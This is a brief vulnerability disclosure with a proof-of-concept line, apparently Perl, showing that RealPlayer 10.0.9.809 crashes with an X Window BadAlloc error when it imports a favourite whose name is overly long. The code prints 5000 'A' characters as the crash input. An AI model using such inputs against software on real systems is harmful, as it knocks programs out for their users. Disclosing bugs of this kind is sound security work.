# RealPlayer 10.0.9.809 (gold) BadAlloc (favourite name) Vulnerability
#
# The error occurs when a "favourite" with an overly long name
# is imported. Lame vulnerability. 
#
# The program 'realplay.bin' received an X Window System error.
# This probably reflects a bug in the program.
# The error was 'BadAlloc (insufficient resources for operation)'.
#   (Details: serial 97072 error_code 11 request_code 53 minor_code 0)
#   (Note to programmers: normally, X errors are reported asynchronously;
#    that is, you will receive the error a while after causing it.
#    To debug your program, run it with the --sync command line
#    option to change this behavior. You can then get a meaningful
#    backtrace from your debugger if you break on the gdk_x_error() function.)

print "A" x 5000;
